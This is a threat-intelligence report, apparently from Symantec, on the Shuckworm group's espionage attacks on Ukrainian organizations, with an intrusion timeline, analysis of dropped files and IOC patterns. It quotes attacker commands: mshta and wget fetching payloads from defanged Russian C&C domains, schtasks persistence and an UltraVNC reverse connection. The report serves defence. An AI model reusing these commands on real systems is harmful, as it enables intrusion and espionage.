Over the course of recent\n[months, Symantec’s Threat Hunter Team, a part of Broadcom Software, has found evidence](https://software.broadcom.com/)\nof attempted attacks against a number of organizations in the country.\n\nActive since at least 2013, Shuckworm specializes in cyber-espionage campaigns mainly\nagainst entities in Ukraine. The group is known to use phishing emails to distribute either\nfreely available remote access tools, including Remote Manipulator System (RMS) and\n[UltraVNC, or customized malware called Pterodo/Pteranodon to targets. A recent report](https://ssu.gov.ua/uploads/files/DKIB/Technical%20report%20Armagedon.pdf)\npublished by The Security Service of Ukraine (SSU) noted that Shuckworm’s attacks have\ngrown in sophistication in recent times, with attackers now using living-off-the-land tools to\nsteal credentials and move laterally on victim networks. Recent activity seen by Symantec is\nconsistent with that documented by SSU.\n\n## Shuckworm activity: Case study\n\nSymantec observed Shuckworm activity on an organization in Ukraine, which began on July\n14, 2021 and continued until August 18, 2021. The attack chain began with a malicious\ndocument, likely sent via a phishing email, which was opened by the user of the infected\nmachine. The following is a breakdown of the attackers’ activity on the compromised\ncomputer.\n\n**July 14**\n\nAt 08:48 (local-time), a suspicious Word document is opened on the machine. Just five\nminutes after the document is opened, a suspicious command is also executed to launch a\nmalicious VBS file (depended.lnk). This file is a known custom backdoor leveraged by\nShuckworm (aka Pterodo).\n\nwscript.exe CSIDL_PROFILE\\searches\\depended.lnk //e:VBScript //b\n\nThe backdoor is used to download and execute CSIDL_PROFILE\\searches\\depended.exe\n(94a78d5dce553832d61b59e0dda9ef2c33c10634ba4af3acb7fb7cf43be17a5b) from\nhxxp://92.242.62.131/wordpress.php?is=[REDACTED].\n\nTwo additional VBS scripts are observed being executed via depended.exe:\n\n\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\roaming\\reflect.rar\n//e:VBScript //b\n\n\n-----\n\nCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\deepthoughted. //e:VBScript //b\n\nA scheduled task is then created to likely ensure persistence between system reboots and to\nexecute the dropped script. This ensures the VBS file deep-thoughted.ppt is executed every\n10 minutes:\n\nSCHTASKS /CREATE /sc minute /mo 10 /tn \"deep-thoughted\" /tr \"wscript.exe \"\nCSIDL_COMMON_PICTURES\\deep-thoughted.ppt //e:VBScript //b\" /F\n\nLater, the attackers are observed executing an HTA file hosted on a remote server by abusing\nmshta.exe via depended.exe. The Mshta utility can execute Microsoft HTML Application\n(HTA) files and can be abused to bypass application control solutions. Since mshta.exe\nexecutes outside of Internet Explorer's security context, it also bypasses browser security\nsettings.\n\n\"CSIDL_SYSTEM\\cmd.exe\" /c CSIDL_SYSTEM\\mshta.exe\nhxxp://fiordan.ru/FILM.html /f id=[REDACTED]\n\nAt the same time, a new variant of Pterodo is installed via depended.exe.\n\nSimilarly to before, two additional scheduled tasks are created:\n\n\"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"MediaConverter\" /tr\n\"wscript.exe \" CSIDL_COMMON_MUSIC\\tvplaylist.mov //e:VBScript //b \" /F\"\n\"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"VideoHostName\"\n/tr \"wscript.exe \" CSIDL_COMMON_VIDEO\\webmedia.m3u //e:VBScript //b \" /F\"\n\nThe attackers continue to install variants of their backdoor and execute commands via scripts\nto ensure persistence:\n\n\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\22333.docx\n//e:VBScript //b\n\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\9140.d\n//e:VBScript //b\nwscript.exe CSIDL_COMMON_MUSIC\\tvplaylist.mov //e:VBScript //b\nschtasks /Create /SC MINUTE /MO 15 /F /tn BackgroundConfigSurveyor /tr\n\"wscript.exe C:\\Users\\o.korol\\AppData\\Roaming\\battery\\battery.dat //e:VBScript\n//b\"\n\"CSIDL_SYSTEM\\cmd.exe\" /c\nCSIDL_PROFILE\\appdata\\roaming\\battery\\battery.cmd\n\nDirectly after this, it appears the attackers test connectivity to a new C&C server via ping.exe:\n\nCSIDL_SYSTEM\\cmd.exe /c ping -n 1 arianat.ru\n\n\n-----\n\nOnce the connection is confirmed to be active, the attackers proceed to download another\nvariant of their Pterodo backdoor and begin using the new C&C to download additional\nscripts and tools, as well as creating scheduled tasks to run every few minutes.\n\n\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\12382.\n//e:VBScript //b\n\"CSIDL_SYSTEM\\cmd.exe\" /c CSIDL_SYSTEM\\mshta.exe hxxp://avirona.ru/7ZIP.html /f id=<?,?>\nCSIDL_SYSTEM\\mshta.exe hxxp://avirona.ru/7-ZIP.html /f id=<?,?>\n\"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"MediaConverter\" /tr\n\"wscript.exe \" CSIDL_COMMON_MUSIC\\mediatv.mov //e:VBScript //b \" /F\"\n\"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"VideoHostName\"\n/tr \"wscript.exe \" CSIDL_COMMON_VIDEO\\videotv.m3u //e:VBScript //b \" /F\"\n\nAt this point, the attackers cease activity. However, we continue to see commands being\nexecuted from the scheduled tasks for the remainder of July 14.\n\n**July 16**\n\nAt 05:28, the attackers return, and several additional variants of Pterodo are executed via\nCSIDL_COMMON_VIDEO\\planeta.exe\n(1ea3881d5d03214d6b7e37fb7b10221ef51782080a24cc3e275f42a3c1ea99c1).\n\n\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\32440.docx\n//e:VBScript //b\n\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\20507.d\n//e:VBScript //b\n\nThe attackers are then observed executing commands via planeta.exe:\n\nCSIDL_SYSTEM\\cmd.exe /c \"\"CSIDL_PROFILE\\appdata\\local\\temp\\7zsfx000.\"\" \"\"\n\"CSIDL_SYSTEM\\cmd.exe\" /c ipconfig /flushdns\n\nThe above flushdns command may indicate that the attackers have updated the DNS records\nfor their C&Cs, as we observed some of their tools use hard-coded domains. In this particular\ninstance, the flushdns command was executed shortly before the attackers attempted to\ninstall additional backdoors that leveraged the same C&C.\n\n**July 28**\n\nLater, another variant ofPterodo (deep-sided.fly) was executed and was used to download\nand execute a new file called deerskin.exe\n(ad1f796b3590fcee4aeecb321e45481cac5bc022500da2bdc79f768d08081a29). This file is a\n\n\n-----\n\ndropper for a VNC client. When executed, it pings google DNS (8.8.8.8) to test internet\nconnectivity, then proceeds to drop a VNC client and establishes a connection to a remote\nC&C server controlled by the attackers:\n\n\"%USERPROFILE%\\Contacts\\DriversHood.exe\" -autoreconnect -id:2097 -connect\nmucoris.ru:5612\n\nTwo such files have been identified that perform the same actions:\n\n1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f\nad1f796b3590fcee4aeecb321e45481cac5bc022500da2bdc79f768d08081a29\n\nThis VNC client appears to be the ultimate payload for this attack.\n\nBetween July 29 and August 18 activity continued whereby we observed the attackers\ndeploying multiple variants of their custom VBS backdoor along with executing VBS scripts\nand creating scheduled tasks similar to the ones detailed above. After August 18, no further\nsuspicious activity was observed on this machine.\n\nDuring the course of this investigation, specifically post VNC client installation, a number of\ndocuments were opened from various locations on the compromised machine. It is unclear if\nthis was legitimate user activity or the activity of the attackers attempting to collect and\nexfiltrate sensitive information. Titles of the documents accessed ranged from job\ndescriptions to sensitive information pertaining to the targeted organization.\n\n## Technical descriptions\n\nSymantec investigations uncovered a total of seven files used by Shuckworm in recent\nattacks. All seven files are 7-zip SFX self-extracting binaries, a format used previously in\nShuckworm attacks.\n\n**descend.exe**\n\nUpon execution, the file named descend.exe\n(0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137) drops a VBS\nfile which, in turn, drops a second VBS file in the following locations:\n\n%USERPROFILE%\\Downloads\\deerbrook.ppt\n%PUBLIC%\\Pictures\\deerbrook.ppt\n\nIt then creates the following task:\n\nSCHTASKS /CREATE /sc minute /mo 11 /tn \"deerbrook\" /tr \"wscript.exe\n'<DROPPED_FOLDER>\\deerbrook.ppt' //e:VBScript //b\" /F\n\n\n-----\n\nThe file deerbrook.ppt\n(b46e872375b3c910fb589ab75bf130f7e276c4bcd913705a140ac76d9d373c9e) VBS file\ncontacts a command-and-control (C&C) server at deep-pitched.enarto.ru. If the C&C server is\navailable, a HTTP POST request is sent to download a payload, which is saved in the\n%USERPROFILE% folder as deep-sunken.tmp then renamed to deep-sunken.exe and\nexecuted. The binary is then deleted.\n\n**deep-sunken.exe**\n\nUpon execution, the file deep-sunken.exe\n(02c41bddd087522ce60f9376e499dcee6259853dcb50ddad70cb3ef8dd77c200) drops the\nfollowing files on the compromised computer:\n\n%APPDATA%\\baby\\baby.cmd\n%APPDATA%\\baby\\baby.dat\n%APPDATA%\\baby\\basement.exe (wget binary)\n%APPDATA%\\baby\\vb_baby.vbs\n\nIt then creates the following task:\n\nschtasks /Create /SC MINUTE /MO 15 /F /tn BackgroundConfigSurveyor /tr\n\"wscript.exe [%APPDATA%]\\baby\\baby.dat\" //e:VBScript //b\n\nIt then connects to a C&C server (arianat.ru) to download another payload using wget:\n\nbasement.exe --user-agent=\"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36\n(KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36 OPR/54.0.2952.64::\n\n[VICTIM_ID]::/.beagle/.\" -q -b -c -t 2 \"hxxp://arianat.ru/baby.php\" -P \"\n\n[%APPDATA%]\\baby\"\n\nThe baby.dat file is a VBS file that executes baby.cmd, which then downloads and executes\nthe payload from the C&C server.\n\nThe vb_baby.vbs file renames the downloaded payload from baby.php to backed.exe.\n\nThe downloaded payload (backed.exe) could not be retrieved. However, the following files\nwere also obtained during our investigation:\n\n**z4z05jn4.egf.exe**\n\nThe file z4z05jn4.egf.exe\n(fd9a9dd9c73088d1ffdea85540ee671d8abb6b5ab37d66a760b2350951c784d0) is similar to\nthe previous file (deep-sunken.exe) but with different folders, file names, and C&C server\n(iruto.ru).\n\n**defiant.exe**\n\n\n-----\n\nOnce executed, the file defiant.exe\n(a20e38bacc979a5aa18f1954df1a2c0558ba23cdc1503af0ad1021c330f1e455) drops a VBS file\nin the following locations:\n\n%TEMP%\\\\deep-versed.nls\n%PUBLIC\\Pictures\\deep-versed.nls\n\nIt then creates the following task:\n\nSCHTASKS /CREATE /sc minute /mo 12 /tn \\\"deep-versed\\\" /tr \\\"wscript.exe \\\"\n\n[%PUBLIC%]\\\\Pictures\\\\deep-versed.nls\\\" //e:VBScript //b\\\" /F\n\nThe dropped file deep-versed.nls\n(817901df616c77dd1e5694e3d75aebb3a52464c23a06820517108c74edd07fbc) downloads a\npayload from a C&C server (deep-toned.chehalo.ru) and saves it as deep-green.exe in the\nfollowing location:\n\n%PUBLIC%\\Downloads\n\n**deep-green.exe**\n\nThe file deep-green.exe\n(1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f) contains an\nUltraVNC binary, which upon execution connects to a repeater (mucoris.ru:5612) using the\nfollowing command line:\n\n-autoreconnect -id:%RANDOM% -connect mucoris.ru:5612\n\nUltraVNC is an open-source remote-administration/remote-desktop-software utility.\n\n**deep-green.exe**\n\nA second file named deep-green.exe\n(f6c56a51c1f0139036e80a517a6634d4d87d05cce17c4ca5adc1055b42bf03aa) contain a\nProcess Explorer (procexp) binary.\n\nProcess Explorer is a freeware task manager and system monitor for Microsoft Windows.\n\n**deep-green.exe**\n\nA third file called deep-green.exe\n(de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a) is similar to\ndescend.exe (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137)\njust with different file names and C&C server (deer-lick.chehalo.ru).\n\n**deep-green.exe**\n\n\n-----\n\nThe fourth and final file named deep-green.exe\n(d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7) drops a VBS file\nin the following location:\n\n%PUBLIC%\\Music\\\n\nIt then creates the following task:\n\n\"/CREATE /sc minute /mo 12 /tn \\\"MediaConverter\\\" /tr \\\"wscript.exe\n\\\"C:\\\\Users\\\\Public\\\\Music\\\\MediaConvertor.dat\\\" //e:VBScript //b \\\" /F\"\n\nThe MediaConvertor.dat file searches for removable drives and creates a .lnk file with the\nfollowing command:\n\nmshta.exe hxxp://PLAZMA.VIBER.ontroma.ru/PLAZMA.html /f id=January\n\n## IOC patterns\n\nAnalysis of the many indicators of compromise (IOCs) uncovered during our investigations\nhave revealed the following patterns, which may be of use when defending networks from\nShuckworm attacks:\n\nMost URL C&C IPs belong to the short list of hosting providers listed in the SSU report,\nnamely AS9123 TimeWeb Ltd. (Russia).\nMost discovered suspected C&C URLs are IP-based URLs and use a unique URI\nstructure:\n\nhttp + IP + /<some-word>.php?<some-word>=<1-integer>,<5-7-randalphanums> OR\nhttp + IP + /<some-word>.php?<some-word>=<1-integer>,<5-7-randalphanums>-<2-integers>\nMost suspected malicious files are found in one of a short list of directories:\n\ncsidl_profile\\links\ncsidl_profile\\searches\nCSIDL_PROFILE\\appdata\\local\\temp\\\nCSIDL_PROFILE\\\n\n\n-----\n\nNearly all the suspected malicious files are made up of a word beginning with the letter\n\"d\" and a few are composed of two words separated by a \"-\" (first word also starting\nwith \"d\"). Examples include:\n\ndeceive.exe\ndeceived.exe\ndeception.exe\ndeceptive.exe\ndecide.exe\ndecided.exe\ndecipher.exe\ndecisive.exe\ndeep-sunken.exe\ndeep-vaulted.exe\nDetected command lines are simple and consist of just the binary path + name; no\nswitches, etc.\nMany suspected malicious files have unknown parent process hashes, none of which\nhave available information.\n\n[According to a November 2021 report from the SSU, since 2014 the Shuckworm group has](https://ssu.gov.ua/en/novyny/sbu-vstanovyla-khakeriv-fsb-yaki-zdiisnyly-ponad-5-tys-kiberatak-na-derzhavni-orhany-ukrainy)\nbeen responsible for over 5,000 attacks against more than 1,500 Ukrainian government\nsystems. As evidenced by Symantec’s recent investigations into attempted Shuckworm\nattacks against a number of organizations in Ukraine, this activity shows little sign of abating.\n\nThe Threat Hunter Team is a group of security experts within Symantec whose\nmission is to investigate targeted attacks, drive enhanced protection in Symantec\nproducts, and offer analysis that helps customers respond to attacks.\n\n\n-----",
